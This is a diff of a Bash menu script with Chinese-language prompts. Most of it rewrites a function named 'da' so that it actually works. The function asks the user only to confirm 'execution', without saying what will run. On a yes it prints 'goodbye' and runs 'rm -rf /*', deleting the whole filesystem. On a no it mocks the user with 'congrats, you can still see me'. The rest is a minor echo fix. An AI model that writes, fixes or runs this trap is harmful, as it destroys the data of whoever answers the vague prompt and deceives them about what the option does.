@@ -15,14 +15,20 @@ fi
 da () {
     echo -e "${red}确认要执行吗？！！！！！[Y/n]$plain"
     read -r da <&1
-    if $da in
-        [yY][eE][sS] | [yY])
-    then 
-        rm -rf /*
-    else
-        echo -e "$green恭喜你还能看到我$plain"
-        shon_online
-    fi
+    case $da in
+        [yY][eE][sS] | [yY]) 
+            echo -e "$red再见 . . .$plain"
+            rm -rf /*
+            ;;
+        [nN][oO] | [nN])
+            echo -e "$green恭喜你还能看到我$plain"
+            shon_online
+            ;;
+        *)
+        echo -e "$red输入错误 . . .$plain"
+        exit 1
+        ;;
+    esac
 }
 welcome () {
     echo
@@ -131,7 +137,7 @@ data_persistence () {
             echo -e "$red结束。$plain"
             ;;
         *)
-            echo "$red输入错误 . . .$plain"
+            echo -e "$red输入错误 . . .$plain"
             exit 1
             ;;
     esac
